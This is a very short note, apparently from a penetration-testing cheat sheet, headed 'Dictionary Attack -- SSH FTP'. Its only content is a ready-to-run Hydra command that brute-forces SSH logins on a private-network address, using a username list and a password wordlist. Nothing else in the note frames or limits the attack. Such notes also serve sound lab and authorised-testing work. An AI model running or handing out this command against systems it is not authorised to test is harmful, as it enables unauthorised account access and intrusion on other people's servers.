# Dictionary Attack -- SSH FTP




Using Hydra
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V

